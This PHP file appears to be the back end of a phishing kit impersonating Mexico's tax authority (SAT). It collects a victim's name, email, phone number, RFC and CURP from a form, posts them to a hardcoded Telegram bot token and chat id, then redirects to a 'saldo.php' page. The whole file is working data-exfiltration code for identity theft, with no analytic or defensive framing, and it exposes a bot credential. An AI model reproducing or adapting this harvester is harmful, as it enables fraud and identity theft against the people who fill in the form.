<?php
error_reporting(0);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('America/Guatemala');

$token = "5158268829:AAF8xc22TgLd0-Rmw1GwP98EVcbAwFbIJYA";
$name = $_POST['name'];
$mail = $_POST['mail'];
$number = $_POST['number'];
$registro = $_POST['registro'];
$estado = $_POST['estado'];
$formfil = $_POST['formfil'];

$datos = [
    'chat_id' => '1835503134',
    #'chat_id' => '@el_canal si va dirigido a un canal',
    'text' => "NUEVOS DATOS RECIBIDOS PRIMERA PARTE \n\n⭐ Nombre: $name \n🪙 Email: $mail \n📞 Numero: $number \n🆔 RFC: $registro \n🌐 Estado: $estado \n🧾 CURP: $formfil \n\nATTE: SATReboot RAAAAAA!",
    'parse_mode' => 'HTML' #formato del mensaje
];


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$r_array = json_decode(curl_exec($ch), true);

curl_close($ch);

if ($r_array['ok'] == 1) {
    header("Location: saldo.php");
} else {
    echo "Mensaje no enviado.";
    print_r($r_array);
}

#if !empty($r_array) && array_key_exists("ok", $r_array);